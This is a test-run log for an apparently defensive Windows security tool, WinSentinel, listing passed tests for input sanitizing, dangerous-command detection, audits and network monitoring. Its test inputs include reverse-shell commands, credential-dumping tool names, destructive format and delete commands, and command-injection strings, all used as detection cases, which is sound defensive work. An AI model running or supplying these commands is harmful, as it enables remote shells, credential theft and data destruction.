  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_ValidUsernames_ReturnsTrimmed(input: "user-name", expected: "user-name") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_ValidUsernames_ReturnsTrimmed(input: "user@domain.com", expected: "user@domain.com") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_ValidUsernames_ReturnsTrimmed(input: "Administrator", expected: "Administrator") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_ValidUsernames_ReturnsTrimmed(input: "DOMAIN\\user", expected: "DOMAIN\\user") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_SafeCommands_ReturnsNull(input: "reg add HKLM\\SOFTWARE\\Key /v Name /t REG_DWORD /"┬╖┬╖┬╖) [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_SafeCommands_ReturnsNull(input: "netsh advfirewall set allprofiles state on") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_SafeCommands_ReturnsNull(input: "sfc /scannow") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_SafeCommands_ReturnsNull(input: "Set-MpPreference -DisableRealtimeMonitoring $false") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_ProtectedFileName_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_CredentialAccess_ReturnsReason(input: "cmdkey /add:server") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_CredentialAccess_ReturnsReason(input: "sekurlsa::logonpasswords") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_CredentialAccess_ReturnsReason(input: "mimikatz.exe") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_CredentialAccess_ReturnsReason(input: "Get-Credential") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_Injection_ReturnsNull(input: "notepad;whoami") [1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_Injection_ReturnsNull(input: "app`ls`") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_Injection_ReturnsNull(input: "app$(id)") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_Injection_ReturnsNull(input: "app|calc") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_Injection_ReturnsNull(input: "app&dir") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_Injection_ReturnsNull(input: "app name with spaces") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_ValidIPv4_ReturnsCanonical(input: "10.0.0.1", expected: "10.0.0.1") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_ValidIPv4_ReturnsCanonical(input: "255.255.255.255", expected: "255.255.255.255") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_ValidIPv4_ReturnsCanonical(input: "192.168.1.1", expected: "192.168.1.1") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_ValidIPv4_ReturnsCanonical(input: "127.0.0.1", expected: "127.0.0.1") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_ValidIPv4_ReturnsCanonical(input: "0.0.0.0", expected: "0.0.0.0") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_Injection_ReturnsNull(input: "admin;whoami") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_Injection_ReturnsNull(input: "admin|net user") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_Injection_ReturnsNull(input: "admin`ls`") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_Injection_ReturnsNull(input: "admin$(whoami)") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_Injection_ReturnsNull(input: "admin&echo pwned") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Invalid_ReturnsNull(input: "CC:") [4 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Invalid_ReturnsNull(input: "C:\\") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Invalid_ReturnsNull(input: ";") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Invalid_ReturnsNull(input: "C; whoami") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Invalid_ReturnsNull(input: "C:\\Windows") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Invalid_ReturnsNull(input: "1:") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_UncPath_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_SystemPid_ReturnsNull(input: "0") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_SystemPid_ReturnsNull(input: "4") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_SystemPid_ReturnsNull(input: "1") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_NullOrEmpty_ReturnsReason(input: "   ", expected: "Empty command") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_NullOrEmpty_ReturnsReason(input: null, expected: "Empty command") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_NullOrEmpty_ReturnsReason(input: "", expected: "Empty command") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_TooLong_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Valid_ReturnsValue(input: "Rule-Name.v2", expected: "Rule-Name.v2") [1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Valid_ReturnsValue(input: "My Custom Rule", expected: "My Custom Rule") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Valid_ReturnsValue(input: "Block Inbound Port 80", expected: "Block Inbound Port 80") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Valid_ReturnsValue(input: "Allow_HTTPS", expected: "Allow_HTTPS") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_WithWhitespace_Trimmed(input: "  192.168.1.1  ", expected: "192.168.1.1") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_NullOrEmpty_ReturnsNull(input: "   ") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_NullOrEmpty_ReturnsNull(input: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_NullOrEmpty_ReturnsNull(input: null) [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_ExactMaxLength_ReturnsValue [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_NullOrEmpty_ReturnsNull(input: "   ") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_NullOrEmpty_ReturnsNull(input: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_NullOrEmpty_ReturnsNull(input: null) [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_ReverseShells_ReturnsReason(input: "ncat -e cmd 10.0.0.1 4444") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_ReverseShells_ReturnsReason(input: "nc.exe -e cmd.exe 10.0.0.1 4444") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_NullOrEmpty_ReturnsNull(input: null) [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_NullOrEmpty_ReturnsNull(input: "   ") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_NullOrEmpty_ReturnsNull(input: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_NormalText_Unchanged [3 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_ValidNames_ReturnsValue(input: "chrome.exe", expected: "chrome.exe") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_ValidNames_ReturnsValue(input: "notepad.exe", expected: "notepad.exe") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_ValidNames_ReturnsValue(input: "my-app.exe", expected: "my-app.exe") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_ValidNames_ReturnsValue(input: "app_v2.0", expected: "app_v2.0") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_TooLong_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_CarriageReturnOnly_Escaped [2 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_CrlfInjection_Escaped [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Valid_ReturnsUppercase(input: "c:", expected: "C:") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Valid_ReturnsUppercase(input: "C:", expected: "C:") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Valid_ReturnsUppercase(input: "C", expected: "C") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Valid_ReturnsUppercase(input: "c", expected: "C") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Valid_ReturnsUppercase(input: "d:", expected: "D:") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_Valid_ReturnsUppercase(input: "D:", expected: "D:") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_ControlChars_Escaped [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_NullOrEmpty_ReturnsNull(input: null) [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_NullOrEmpty_ReturnsNull(input: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_NullOrEmpty_ReturnsNull(input: "   ") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_ExactMaxLength_ReturnsValue [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_ValidPaths_ReturnsCanonicalized [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_ValidIPv6_ReturnsCanonical(input: "fe80::1", expected: "fe80::1") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_ValidIPv6_ReturnsCanonical(input: "::1", expected: "::1") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_DestructiveCommands_ReturnsReason(input: "format C: /y", reasonContains: "destructive format") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_DestructiveCommands_ReturnsReason(input: "del /s /q C:\\*", reasonContains: "recursive delete") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_PathTraversal_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_ShellMetachars_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_ValidPid_ReturnsValue(input: "1234", expected: "1234") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_ValidPid_ReturnsValue(input: "8080", expected: "8080") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_NullOrEmpty_ReturnsEmpty(input: "", expected: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_NullOrEmpty_ReturnsEmpty(input: null, expected: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_NullOrEmpty_ReturnsNull(input: "   ") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_NullOrEmpty_ReturnsNull(input: null) [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeDriveLetter_NullOrEmpty_ReturnsNull(input: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_NullOrEmpty_ReturnsNull(input: "   ") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_NullOrEmpty_ReturnsNull(input: null) [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_NullOrEmpty_ReturnsNull(input: "") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_AlternateDataStream_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_UserProfile_Accepted [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Injection_ReturnsNull(input: "rule$(id)") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Injection_ReturnsNull(input: "rule&calc.exe") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Injection_ReturnsNull(input: "rule`ls`") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Injection_ReturnsNull(input: "rule;whoami") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Injection_ReturnsNull(input: "rule|echo pwned") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeProcessInput_TooLong_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_TooLong_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_CaseInsensitive [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_NewlineOnly_Escaped [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_NullByte_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_WithWhitespace_Trimmed(input: "  admin  ", expected: "admin") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeFirewallRuleName_Trimmed(input: "  My Rule  ", expected: "My Rule") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_ProtectedWindowsDir_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeForLog_NullByte_Escaped [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_EncodedCommands_ReturnsReason(input: "powershell -encodedcommand ZQBjAGgAbwA=") [< 1 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_Succeeds [8 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_ChecksTelemetry [1 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_FindingsHaveRequiredFields [1 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_HasValidTimestamps [1 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_SupportsCancellation [1 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_WarningFindingsHaveRemediation [4 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_ScoreIsValid [1 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.PrivacyAuditTests.RunAuditAsync_ProducesFindings [1 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Query_ByEntryType_Filters [6 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.RecordCorrelation_CreatesCorrectEntry [12 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.RecordThreat_CreatesCorrectEntry [5 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Query_OrdersByTimestampDescending [5 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Query_ByTag_Filters [5 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.RecordRemediation_CreatesCorrectEntry [4 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Query_BySource_Filters [6 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.GetTodaySummary_AggregatesCorrectly [11 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Query_ByMinSeverity_Filters [4 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.JournalSummary_ToString_FormatsCorrectly [5 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Query_WithLimit_RespectsLimit [15 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Query_BySearchText_SearchesSummaryAndDetails [6 ms]
  Passed WinSentinel.Tests.Agent.AgentJournalTests.Record_StoresEntry [3 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.ResponsePolicy_ClassifiesNetworkMonitor_CaseInsensitive [< 1 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.AgentConfig_Snapshot_IncludesNewFields [2 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.ResponsePolicy_RemoveUserOverride_NonexistentReturnsFalse [< 1 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.AgentConfig_SnapshotRoundTrip_PreservesAllFields [13 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.AgentConfig_IsModuleEnabled_NetworkMonitor_CanBeDisabled [< 1 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.ResponsePolicy_AddUserOverride_Works [1 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.AgentConfig_ApplySnapshot_SetsNewFields [1 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.ResponsePolicy_AddUserOverride_ReplacesDuplicate [18 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.AgentConfig_IsModuleEnabled_NetworkMonitor_DefaultTrue [< 1 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.ResponsePolicy_RemoveUserOverride_Works [16 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.AgentConfig_DefaultValues_AreCorrect [1 ms]
  Passed WinSentinel.Tests.Agent.PolicySettingsTests.ResponsePolicy_ClassifiesNetworkMonitor [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "", expected: False) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "manage-bde -on C:", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Update-MpSignature", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "explorer.exe shell:startup", expected: False) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Disable-LocalUser -Name 'Guest'", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Test' -Na"┬╖┬╖┬╖, expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Set-MpPreference -DisableRealtimeMonitoring $false", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Set-SmbServerConfiguration -EnableSMB1Protocol $fa"┬╖┬╖┬╖, expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Write-Output 'hello'", expected: False) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Start-Process ms-settings:windowsupdate", expected: False) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Stop-Service WinRM", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Get-Process | Format-Table", expected: False) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Test' -Na"┬╖┬╖┬╖, expected: False) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "shutdown /r /t 60", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "net accounts /minpwlen:8", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.RequiresElevation_CorrectlyDetects(command: "netsh advfirewall set currentprofile state on", expected: True) [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_RecordsDuration [701 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.IsElevated_ReturnsBoolean [5 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_Cancellation_ReturnsCancelled [16 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_WhitespaceFixCommand_ReturnsNoFixAvailable [< 1 ms]
  Passed WinSentinel.Tests.Audits.SystemAuditTests.RunAuditAsync_ProducesMultipleFindings [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.ApplySnapshot_Handles_Invalid_RiskTolerance [1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteCommandAsync_Works [792 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.FixResult_ToString_FormatsCorrectly [1 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.Save_And_Load_Persistence [17 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.IsModuleEnabled_Returns_True_When_Enabled [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.Snapshot_RiskTolerance_Is_String [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.ToSnapshot_And_ApplySnapshot_Roundtrip [1 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.IsModuleEnabled_Returns_True_For_Unknown_Module [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.New_Config_Has_Sensible_Defaults [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentConfigTests.IsModuleEnabled_Returns_False_When_Disabled [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.RapidMultiModule_ThreeSources_DetectsCorrelation [3 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.ExtractDirectory_NoPath_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.DefenderDisabled_PlusSuspiciousProcess_DetectsCorrelation [1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.ProcessPlusDll_MatchingDirectory_DetectsCorrelation [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.ExtractDirectory_ParsesPathCorrectly [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.SeverityScore_ReturnsCorrectValue(severity: Medium, expected: 15) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.SeverityScore_ReturnsCorrectValue(severity: Critical, expected: 40) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.SeverityScore_ReturnsCorrectValue(severity: Info, expected: 1) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.SeverityScore_ReturnsCorrectValue(severity: High, expected: 25) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.SeverityScore_ReturnsCorrectValue(severity: Low, expected: 5) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.CalculateChainScore_SumsCorrectly [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.HostsFileModified_PlusSuspiciousProcess_DetectsCorrelation [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.BruteForce_WithEscalation_DetectsCorrelation [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.Reset_ClearsWindow [3 ms]
  Passed WinSentinel.Tests.Agent.ThreatCorrelatorTests.ProcessPlusDll_DifferentDirectory_NoCorrelation [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.TorPorts_AreCorrect [1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.GetGatewayMacAddress_ReturnsNullOrValidMac [428 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.PollInterval_Is30Seconds [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.IsActive_InitiallyFalse [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_ContainsCommonRatPorts(port: 6666) [1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_ContainsCommonRatPorts(port: 31337) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_ContainsCommonRatPorts(port: 5555) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_ContainsCommonRatPorts(port: 4444) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_ContainsCommonRatPorts(port: 12345) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_ContainsCommonRatPorts(port: 1337) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_DoesNotContainLegitPorts(port: 80) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_DoesNotContainLegitPorts(port: 53) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.SuspiciousPorts_DoesNotContainLegitPorts(port: 443) [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.CheckConnectionChurn_AlertsAboveThreshold [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_CommandWithQuotes_HandlesCorrectly [528 ms]
  Passed WinSentinel.Tests.Audits.FirewallAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.PollNetworkState_DoesNotThrow [487 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.TorExitNodePrefixes_ContainsTorRanges [1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.Name_ReturnsNetworkMonitor [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.BurstThreshold_Is50 [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.CheckConnectionChurn_NoAlertBelowThreshold [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.CheckArpChanges_DoesNotThrow [387 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.KnownBadIpPrefixes_ContainsMaliciousRanges [< 1 ms]
  Passed WinSentinel.Tests.Agent.NetworkMonitorModuleTests.PollNetworkState_TwiceDoesNotThrow [578 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "24.0", expectedMajor: 24, expectedMinor: 0) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "7.00", expectedMajor: 7, expectedMinor: 0) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "3.0.20.0", expectedMajor: 3, expectedMinor: 0) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "133.0.6943.0", expectedMajor: 133, expectedMinor: 0) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "3.12.1", expectedMajor: 3, expectedMinor: 12) [< 1 ms]
